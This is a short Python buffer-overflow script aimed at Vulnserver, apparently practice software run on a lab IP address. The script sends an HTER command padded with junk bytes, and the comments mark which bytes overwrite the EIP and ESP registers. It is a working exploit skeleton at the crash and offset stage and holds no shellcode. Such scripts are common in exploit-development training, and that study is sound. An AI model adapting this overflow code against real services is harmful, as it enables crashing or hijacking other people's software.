import socket

ip = "10.0.2.7"       # IP of the victim machine
port = 9999                 # Vulnserver's port number
#buff = b"TRUN /.:/"         # TRUN command for Vulnserver
buff = b"HTER "         # TRUN command for Vulnserver
# buff = b"TRUN DDDD"         # TRUN command for Vulnserver
buff += b"A" * 2041         # Junk Bytes 2051-5+2
buff += b"B" * 4            # Bytes that will overwrite the EIP
buff += b"C" * 3000+b"\x00"         # Bytes that will overwrite the ESP



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
print(s.recv(1024).decode('utf-8'))
s.send(buff)
s.close()


